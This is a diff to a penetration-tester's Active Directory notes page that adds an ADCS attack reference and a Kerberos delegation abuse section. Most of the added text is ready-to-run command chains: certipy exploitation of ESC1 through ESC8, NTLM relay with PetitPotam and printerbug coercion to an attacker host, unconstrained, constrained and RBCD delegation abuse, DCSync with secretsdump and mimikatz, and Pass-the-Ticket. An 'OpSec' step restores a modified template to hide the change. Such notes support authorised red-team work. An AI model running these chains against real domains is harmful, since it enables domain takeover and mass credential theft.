@@ -6,8 +6,6 @@ title = "Active Directory"
     - Filter by info currently known and by attack type like enumeration, exploitation, etc.
 - https://adsecurity.org/
 
-{{< embed-section page="Docs/2 - Pre-Engagement/checklist" header="active-directory" >}}
-
 # Authentication Protocol Selection
 
 | Method | Authentication Protocol | Encryption | Limitations |
@@ -689,8 +687,7 @@ netexec smb <DC_IP> -u <USER> -p <PASSWORD>
 .\Rubeus.exe kerberoast /nowrap /tgtdeleg /user:<USER>
 ```
 
-**NOTE:** This RC4 downgrade does not work against a Windows Server 2019 Domain Controller. It will always return a service ticket encrypted with the highest level of encryption supported by the target account
-#### via PowerView
+**NOTE:** This RC4 downgrade does not work against a Windows Server 2019 Domain Controller. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. `/tgtdeleg` is a client-side negotiation hint only — it cannot override DC or account policy. The SPN account's `msDS-SupportedEncryptionTypes` attribute must include RC4 (flag value `0x4`) for the DC to issue an RC4-encrypted ticket; if the account or domain policy excludes RC4, the DC will issue AES regardless of what the client requests.#### via PowerView
 
 ```bash
 # Enumerate SPN Accounts
@@ -1015,7 +1012,7 @@ python3 pywhisker.py --dc-ip <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --tar
 python3 -m venv venv
 pip install git+https://github.com/fortra/impacket.git
 hash -r
-venv/bin/ntlmrelayx.py --adcs -smb2support --template KerberosAuthentication -t <WEB_ENROLL_SERVER>
+venv/bin/ntlmrelayx.py --adcs --smb2support --template KerberosAuthentication -t <WEB_ENROLL_SERVER>
 # outputs *.pfx file
 
 # Force arbitrary auth from <TARGET> to <ATTACKER> via printers
@@ -1057,6 +1054,473 @@ impacket-secretsdump -k -no-pass -dc-ip <DC_IP> -just-dc-user Administrator '<DO
 
 evil-winrm ... -H <HASH>
 ```
+
+# ADCS Attack Reference
+
+{{< embed-section page="Docs/1 - Meta/old-checklist" header="adcs" >}}
+
+- https://specterops.io/blog/2022/06/13/certificates-and-pwnage-and-patches/
+- https://github.com/ly4k/Certipy
+- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6
+
+## Triage
+
+```bash
+certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -enabled
+```
+
+Read the output top-down: CA-level vulnerabilities appear under the CA block; template-level vulnerabilities appear under each template block. The `[!] Vulnerabilities:` line names the ESC type directly.
+
+| `[!] Vulnerabilities:` value | Where in output | Key field to confirm |
+| --- | --- | --- |
+| `ESC1` | Template block | `Enrollee Supplies Subject: True` + `Client Authentication: True` |
+| `ESC2` | Template block | `Extended Key Usage: Any Purpose` or empty EKU |
+| `ESC3` | Template block | `Extended Key Usage: Certificate Request Agent` |
+| `ESC4` | Template block | `Permissions` shows Write rights for low-priv principal |
+| `ESC6` | CA block | `User Specified SAN: Enabled` (`EDITF_ATTRIBUTESUBJECTALTNAME2`) |
+| `ESC7` | CA block | `Permissions` shows `ManageCA` or `ManageCertificates` for low-priv principal |
+| `ESC8` | CA block | `Web Enrollment: Enabled` |
+
+---
+
+## ESC1 — User-controllable SAN
+
+- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
+
+**Signal:** Template block shows `Enrollee Supplies Subject: True` + `Client Authentication: True` + low-privilege principals in `Enrollment Rights`.
+
+**Why it works:** When `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is set, the requester controls the Subject Alternative Name (SAN) field. The DC resolves identity from the SAN UPN, not the requester's actual identity. PKINIT uses this SAN to issue a TGT for whoever is named — no password required.
+
+```bash
+# Request a cert for Administrator (supply their UPN in the SAN)
+certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> \
+  -upn administrator@<DOMAIN>
+
+# Authenticate via PKINIT — outputs NT hash + saves TGT as administrator.ccache
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+
+export KRB5CCNAME=administrator.ccache
+```
+
+---
+
+## ESC2 — Any Purpose EKU
+
+- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
+
+**Signal:** Template block shows `Extended Key Usage: Any Purpose` or no EKU at all, with low-privilege enrollment rights.
+
+**Why it works:** Any Purpose EKU allows the certificate to satisfy any extended key usage check, including the Certificate Request Agent EKU used for enrollment agent operations. The CA does not enforce that enrollment agent certs carry the specific OID, so this cert can be misused to enroll on behalf of other users.
+
+```bash
+# Step 1 — Enroll using the Any Purpose template (produces <USER>.pfx)
+certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME>
+
+# Step 2 — Use that cert as an enrollment agent to request on behalf of Administrator
+certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -template User \
+  -pfx <USER>.pfx -on-behalf-of '<DOMAIN>\Administrator'
+
+# Authenticate
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+---
+
+## ESC3 — Enrollment Agent Abuse
+
+- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
+
+**Signal:** Template block shows `Extended Key Usage: Certificate Request Agent` with low-privilege enrollment rights. Often paired with a second template that Enrollment Agents are authorized to enroll in.
+
+**Why it works:** A Certificate Request Agent cert lets the holder enroll for certificates on behalf of any other user. AD CS trusts the agent cert and issues the resulting certificate in the target user's name, which can then be used for PKINIT authentication.
+
+```bash
+# Step 1 — Enroll to get the Enrollment Agent cert (produces <USER>.pfx)
+certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME>
+
+# Step 2 — Use agent cert to enroll on behalf of Administrator
+# -on-behalf-of format: NETBIOS_DOMAIN\username (short domain name, not FQDN)
+certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -template User \
+  -pfx <USER>.pfx -on-behalf-of '<DOMAIN>\Administrator'
+
+# Authenticate
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+**NOTE:** `-on-behalf-of` takes the NetBIOS domain name (`CORP\Administrator`), not the FQDN. The second template (`User` here) must be one that Enrollment Agents are authorized to use.
+
+---
+
+## ESC4 — Vulnerable Template ACL
+
+- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
+
+**Signal:** Template block `Permissions` shows `WriteDacl`, `WriteOwner`, or `WriteProperty` rights for a low-privilege principal on the template object.
+
+**Why it works:** Write access to the template AD object lets you modify its properties — specifically enabling `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` and adding low-privilege enrollment rights, converting the template into an ESC1-vulnerable state.
+
+```bash
+# Step 1 — Back up original template config (produces <TEMPLATE_NAME>.json)
+certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -template <TEMPLATE_NAME> -save-old
+
+# Step 2 — Overwrite template with ESC1-vulnerable configuration
+certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -template <TEMPLATE_NAME> -write-default-configuration
+
+# Step 3 — Exploit as ESC1
+certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -template <TEMPLATE_NAME> \
+  -upn administrator@<DOMAIN>
+
+# Step 4 — Restore original template (OpSec)
+certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -template <TEMPLATE_NAME> -write-configuration <TEMPLATE_NAME>.json
+
+# Authenticate
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+---
+
+## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
+
+- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
+
+**Signal:** CA block shows `User Specified SAN: Enabled`. CA-level flag — applies to all templates on that CA.
+
+**Why it works:** `EDITF_ATTRIBUTESUBJECTALTNAME2` tells the CA to honor the SAN field from the requester on any certificate request, regardless of whether the template enables `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`. Any template with Client Authentication EKU and low-privilege enrollment rights becomes exploitable.
+
+```bash
+# Any Client Authentication template works — not just explicitly vulnerable ones
+certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -template User \
+  -upn administrator@<DOMAIN>
+
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+---
+
+## ESC7 — Vulnerable CA ACL
+
+- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
+- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6
+
+**Signal:** CA block `Permissions` shows `ManageCA` or `ManageCertificates` for a low-privilege principal.
+
+**Why it works:** `ManageCertificates` (Officer role) lets you approve denied certificate requests. `ManageCA` lets you grant yourself the Officer role. The SubCA template allows specifying a SAN but always denies low-privilege requests — an Officer can force-issue that denied request and then retrieve it.
+
+```bash
+# Step 1 — Grant yourself the Officer role (requires ManageCA)
+certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -add-officer <USER>
+
+# Step 2 — Enable SubCA template on the CA
+certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -enable-template SubCA
+
+# Step 3 — Request as Administrator; will be DENIED. Note the Request ID in output.
+certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -template SubCA \
+  -upn administrator@<DOMAIN>
+
+# Step 4 — Force-issue the denied request using Officer rights
+certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -issue-request <REQUEST_ID>
+
+# Step 5 — Retrieve the issued certificate
+certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
+  -target <TARGET_IP> -ca <CA_NAME> -retrieve <REQUEST_ID>
+
+# Authenticate
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+```
+
+**NOTE:** If you only have `ManageCertificates` (not `ManageCA`), skip Step 1. If you only have `ManageCA`, run Step 1 first to grant yourself `ManageCertificates`, then proceed.
+
+---
+
+## ESC8 — NTLM Relay to HTTP Enrollment
+
+- https://specterops.io/blog/2021/06/17/certified-pre-owned-abusing-active-directory-certificate-services/
+- https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6
+
+**Signal:** CA block shows `Web Enrollment: Enabled`. The endpoint `http://<CA_NAME>/certsrv/` is accessible over HTTP, not HTTPS.
+
+**Why it works:** The ADCS Web Enrollment endpoint (`/certsrv/certfnsh.asp`) accepts NTLM authentication over HTTP. HTTP NTLM is relay-able because Extended Protection for Authentication (EPA / channel binding) is not enforced by default on HTTP — only on HTTPS. Coercing a DC's machine account to authenticate to the attacker and relaying those credentials to the CA yields a DC certificate, which enables PKINIT as the DC and leads to DCSync.
+
+```bash
+# Terminal 1 — Relay NTLM to the Web Enrollment endpoint, request DC cert
+sudo impacket-ntlmrelayx --smb2support --adcs \
+  -t http://<TARGET_IP>/certsrv/certfnsh.asp
+
+# Terminal 2 — Coerce DC machine account auth to attacker (unauthenticated PetitPotam)
+python3 PetitPotam.py -u '' -p '' <ATTACKER_IP> <DC_IP>
+
+# Authenticated coercion if unauthenticated path is patched
+python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>
+```
+
+ntlmrelayx outputs a base64-encoded certificate. Decode and authenticate:
+
+```bash
+echo '<BASE64_BLOB>' | base64 -d > dc.pfx
+
+# Authenticate as DC machine account — outputs NT hash, saves TGT
+certipy auth -pfx dc.pfx -dc-ip <DC_IP>
+
+# DCSync using NT hash
+impacket-secretsdump -hashes :<NT_HASH> '<DOMAIN>/DC$@<DC_IP>'
+```
+
+---
+
+## Decision Tree
+
+| certipy find shows | ESC | First move |
+| --- | --- | --- |
+| Template: `Enrollee Supplies Subject: True` + `Client Authentication: True` + low-priv enrollment | ESC1 | `certipy req ... -template <TEMPLATE_NAME> -upn administrator@<DOMAIN>` |
+| Template: `Extended Key Usage: Any Purpose` (or empty) + low-priv enrollment | ESC2 | Enroll → use resulting cert with `-pfx` + `-on-behalf-of '<DOMAIN>\Administrator'` |
+| Template: `Extended Key Usage: Certificate Request Agent` + low-priv enrollment | ESC3 | Enroll for agent cert → `req ... -pfx <agent.pfx> -on-behalf-of '<DOMAIN>\Administrator'` |
+| Template: `WriteDacl`/`WriteOwner`/`WriteProperty` for low-priv principal | ESC4 | `certipy template ... -write-default-configuration` → ESC1 chain |
+| CA: `User Specified SAN: Enabled` | ESC6 | `certipy req ... -template User -upn administrator@<DOMAIN>` |
+| CA: `ManageCA` or `ManageCertificates` for low-priv principal | ESC7 | `certipy ca ... -add-officer <USER>` → SubCA deny → force-issue → retrieve |
+| CA: `Web Enrollment: Enabled` (HTTP) | ESC8 | `ntlmrelayx --adcs -t http://<TARGET_IP>/certsrv/certfnsh.asp` → coerce DC |
+
+**All ESC paths converge here:**
+```bash
+certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
+# NT hash → evil-winrm -H <NT_HASH> / impacket-secretsdump / psexec
+```
+
+---
+
+# Kerberos Delegation Abuse
+
+- https://blog.harmj0y.net/activedirectory/s4u2pwnage/
+- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
+- https://dirkjanm.io/resource-based-constrained-delegation-attack-from-outside-using-rbcd-attack-tool/
+
+## Detection
+
+```powershell
+# Unconstrained delegation — computers with TRUSTED_FOR_DELEGATION
+Get-DomainComputer -Unconstrained | select dnshostname, useraccountcontrol
+# Exclude DCs — they always have unconstrained delegation by design
+Get-DomainComputer -Unconstrained | Where-Object { $_.dnshostname -notmatch "dc" } | select dnshostname
+
+# Constrained delegation — accounts with msDS-AllowedToDelegateTo set
+Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
+Get-DomainComputer -TrustedToAuth | select dnshostname, msds-allowedtodelegateto
+
+# RBCD — computers with msDS-AllowedToActOnBehalfOfOtherIdentity set
+Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match "WriteProperty|GenericAll|GenericWrite" -and $_.SecurityIdentifier -ne "S-1-5-18" } | select ObjectDN, SecurityIdentifier, ActiveDirectoryRights
+```
+
+```bash
+# ldapsearch — unconstrained delegation (userAccountControl bit 0x80000 = TRUSTED_FOR_DELEGATION)
+ldapsearch -H ldap://<DC_IP> -x -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' \
+  '(userAccountControl:1.2.840.113556.1.4.803:=524288)' dnshostname useraccountcontrol
+
+# ldapsearch — constrained delegation
+ldapsearch -H ldap://<DC_IP> -x -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' \
+  '(msDS-AllowedToDelegateTo=*)' samaccountname msDS-AllowedToDelegateTo
+
+# ldapsearch — RBCD (any computer with the attribute set — usually indicates prior attack or misconfiguration)
+ldapsearch -H ldap://<DC_IP> -x -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'DC=<DOMAIN>,DC=local' \
+  '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' dnshostname
+```
+
+BloodHound Cypher:
+```
+// Unconstrained delegation computers (excluding DCs)
+MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name CONTAINS "DC" RETURN c.name
+
+// Constrained delegation (any principal with msDS-AllowedToDelegateTo)
+MATCH (n) WHERE n.allowedtodelegate IS NOT NULL RETURN n.name, n.allowedtodelegate
+
+// RBCD entry points — principals with GenericAll/GenericWrite on computer objects
+MATCH p=shortestPath((n)-[r:GenericAll|GenericWrite|WriteDacl|Owns*1..]->(c:Computer)) RETURN p
+```
+
+---
+
+## Unconstrained Delegation Attack
+
+- https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
+- https://adsecurity.org/?p=1667
+
+**Prereqs:** Admin-level access (or code execution) on a host that has `TRUSTED_FOR_DELEGATION` set. DCs always have this — the target is non-DC hosts with it set. Goal: coerce a DC to authenticate to your host, capture its TGT from memory, then DCSync.
+
+**Why it works:** When a host has unconstrained delegation, any authenticating principal's full TGT is forwarded to and cached in that host's LSA. Coercing the DC machine account to authenticate delivers the DC's own TGT — which can be used for DCSync or Golden Ticket creation.
+
+```powershell
+# Windows — start monitoring for incoming TGTs (run as SYSTEM on the unconstrained host)
+Rubeus.exe monitor /interval:5 /targetuser:DC01$ /nowrap
+```
+
+```bash
+# Linux — trigger DC machine account authentication to your host
+# PetitPotam (MS-EFSRPC coercion — unauthenticated if unpatched)
+python3 PetitPotam.py -u '' -p '' <ATTACKER_IP> <DC_IP>
+
+# Authenticated coercion
+python3 PetitPotam.py -u <USER> -p <PASS> -d <DOMAIN> <ATTACKER_IP> <DC_IP>
+
+# Or SpoolSample / printerbug.py (MS-RPRN — requires print spooler running on DC)
+python3 printerbug.py '<DOMAIN>/<USER>:<PASS>'@<TARGET_FQDN> <ATTACKER_IP>
+```
+
+Rubeus `monitor` prints base64-encoded KIRBI to stdout when the DC TGT arrives. Pass-the-Ticket:
+
+```powershell
+# Windows PtT — inject captured TGT into current session
+Rubeus.exe ptt /ticket:<BASE64_KIRBI>
+
+# Verify
+klist
+
+# DCSync from Windows (after PtT)
+mimikatz.exe "lsadump::dcsync /domain:<DOMAIN> /user:Administrator" exit
+```
+
+```bash
+# Linux — decode Rubeus base64 output and convert KIRBI → ccache
+echo '<BASE64_KIRBI>' | tr -d '\n ' | base64 -d > dc.kirbi
+impacket-ticketConverter dc.kirbi dc.ccache
+export KRB5CCNAME=$PWD/dc.ccache
+
+# DCSync
+impacket-secretsdump -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/DC01$'@<TARGET_FQDN>
+```
+
+---
+
+## Constrained Delegation Attack (S4U2Self + S4U2Proxy)
+
+- https://blog.harmj0y.net/activedirectory/s4u2pwnage/
+- https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/
+
+**Prereqs:** Control of an account (user or computer) that has `msDS-AllowedToDelegateTo` populated. You need its password, NT hash, or AES key. The account must have `SeEnableDelegationPrivilege` or the domain must allow protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION`).
+
+**Why it works:** S4U2Self lets a service request a service ticket for any user to itself. S4U2Proxy lets it then exchange that ticket for a service ticket to a target in `msDS-AllowedToDelegateTo`. The DC issues the target ticket impersonating the requested user — no interaction from the impersonated user required.
+
+```bash
+# Linux — Step 1: Get TGT for the delegating account
+impacket-getTGT '<DOMAIN>/<USER>:<PASS>' -dc-ip <DC_IP>
+export KRB5CCNAME=<USER>.ccache
+
+# Step 2: S4U — request service ticket impersonating Administrator
+# -spn must be one of the SPNs listed in msDS-AllowedToDelegateTo
+impacket-getST -spn <SPN> -impersonate Administrator \
+  -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<USER>'
+# Output: saves Administrator.ccache in current directory
+
+# Step 3: Use the ticket
+export KRB5CCNAME=$PWD/Administrator.ccache
+impacket-psexec -k -no-pass <TARGET_FQDN>
+impacket-secretsdump -k -no-pass <TARGET_FQDN>
+```
+
+With hash instead of password:
+```bash
+impacket-getST -spn <SPN> -impersonate Administrator \
+  -hashes :<NT_HASH> -dc-ip <DC_IP> '<DOMAIN>/<USER>'
+```
+
+```powershell
+# Windows — Rubeus S4U (pass, RC4, or AES)
+Rubeus.exe s4u /user:<USER> /password:<PASS> /domain:<DOMAIN> /dc:<DC_IP> `
+  /impersonateuser:Administrator /msdsspn:<SPN> /ptt /nowrap
+
+# With NT hash
+Rubeus.exe s4u /user:<USER> /rc4:<NT_HASH> /domain:<DOMAIN> /dc:<DC_IP> `
+  /impersonateuser:Administrator /msdsspn:<SPN> /ptt /nowrap
+```
+
+**NOTE:** `/ptt` injects the ticket directly into the current session. Without it, Rubeus writes the ticket to disk as base64-KIRBI.
+
+---
+
+## RBCD Attack
+
+- https://dirkjanm.io/resource-based-constrained-delegation-attack-from-outside-using-rbcd-attack-tool/
+- https://blog.harmj0y.net/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
+
+**Prereqs:**
+- Write access to the target computer's AD object (`GenericAll`, `GenericWrite`, `WriteDacl`, or `WriteProperty` over `msDS-AllowedToActOnBehalfOfOtherIdentity`). BloodHound shows this as an edge pointing to the computer.
+- `ms-DS-MachineAccountQuota > 0` (default is 10) OR control of an existing computer/service account.
+- A DC to communicate with.
+
+**Why it works:** RBCD delegates trust in the opposite direction — the resource (target computer) declares which accounts can act on behalf of users. Writing your controlled account's SID into the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute makes the target accept S4U requests from your account, impersonating any user including Administrator. No domain admin involvement.
+
+```bash
+# Step 1 — Add a fake computer account (requires MachineAccountQuota > 0)
+impacket-addcomputer -method SAMR \
+  -computer-name '<ATTACKER_COMPUTER>$' \
+  -computer-pass '<PASS>' \
+  -dc-ip <DC_IP> \
+  '<DOMAIN>/<USER>:<PASS>'
+
+# Step 2 — Write RBCD: allow <ATTACKER_COMPUTER>$ to act on behalf of users on <TARGET>
+impacket-rbcd -delegate-from '<ATTACKER_COMPUTER>$' \
+  -delegate-to '<TARGET_COMPUTER>$' \
+  -action write \
+  -dc-ip <DC_IP> \
+  '<DOMAIN>/<USER>:<PASS>'
+
+# Verify the write
+impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' \
+  -dc-ip <DC_IP> '<DOMAIN>/<USER>:<PASS>'
+
+# Step 3 — Get TGT for the fake computer account
+impacket-getTGT '<DOMAIN>/<ATTACKER_COMPUTER>$:<PASS>' -dc-ip <DC_IP>
+export KRB5CCNAME=<ATTACKER_COMPUTER>\$.ccache
+
+# Step 4 — S4U: impersonate Administrator on target
+impacket-getST -spn cifs/<TARGET_FQDN> -impersonate Administrator \
+  -k -no-pass -dc-ip <DC_IP> '<DOMAIN>/<ATTACKER_COMPUTER>$'
+# Output: Administrator.ccache
+
+# Step 5 — PtT and access
+export KRB5CCNAME=$PWD/Administrator.ccache
+impacket-psexec -k -no-pass <TARGET_FQDN>
+impacket-secretsdump -k -no-pass <TARGET_FQDN>
+```
+
+```powershell
+# Windows alternative — Step 2 via PowerView
+$ComputerSid = Get-DomainComputer '<ATTACKER_COMPUTER>' -Properties objectsid | Select-Object -ExpandProperty objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer <TARGET_COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+```
+
+---
+
+## Common Failure Points + Fixes
+
+| Symptom | Likely Cause | Fix |
+| --- | --- | --- |
+| `KRB_AP_ERR_SKEW` on any getST / getTGT | Clock skew between attacker and DC exceeds 5 minutes | `sudo ntpdate -u <DC_IP>` or `sudo timedatectl set-ntp true` |
+| `KDC_ERR_BADOPTION` from getST S4U | Account does not have protocol transition (`TRUSTED_TO_AUTH_FOR_DELEGATION` not set) | Verify `Get-DomainUser -TrustedToAuth`; without this flag, S4U2Proxy requires a forwardable ST from the user — use `-additional-ticket` |
+| `KDC_ERR_BADOPTION` from getST RBCD | `msDS-AllowedToActOnBehalfOfOtherIdentity` not written, SID mismatch, or target SPN wrong | Re-run `impacket-rbcd -action read` to verify; check SPN with `setspn -L <TARGET_COMPUTER>` |
+| `addcomputer` fails with `LDAP Error: insufficientAccessRights` | `ms-DS-MachineAccountQuota` is 0 or account lacks rights | Check quota: `Get-DomainObject -Identity 'DC=<DOMAIN>' | select ms-ds-machineaccountquota`; if 0, you need control of an existing computer account |
+| `addcomputer` SAMR failure — access denied | Low-priv account cannot create machine accounts over SAMR on this DC | Try `-method LDAPS` if LDAPS is enabled, or use an existing controlled computer account |
+| `rbcd write` — no error but attribute not set | Permissions check was wrong; write silently accepted wrong ACL | Verify with `impacket-rbcd -action read`; BloodHound edge may not reflect current ACL — run SharpHound again |
+| Rubeus `monitor` shows no tickets | Not running as SYSTEM; coercion not reaching this host | Verify process integrity with `whoami /groups`; confirm attacker IP is reachable from DC (firewall); try different coercion method |
+| getST produces ticket but `psexec -k` fails with `STATUS_LOGON_FAILURE` | Service ticket is for `cifs/NETBIOS` but host expects `cifs/FQDN` (or vice versa) | Re-run getST with the exact SPN the host is registered for (`setspn -L <TARGET_COMPUTER>`); try both NETBIOS and FQDN variants |
+| Rubeus `ptt` succeeds but `dir \\target\c$` fails | Double-hop / credential delegation issue | Confirm the `monitor` ticket was for the DC's machine account (`DC01$`), not a user ticket |
+| KIRBI → ccache conversion fails | Whitespace or line breaks in Rubeus base64 output | Pipe through `tr -d '\n '` before `base64 -d` |
+
+---
 
 # Mitigation
 
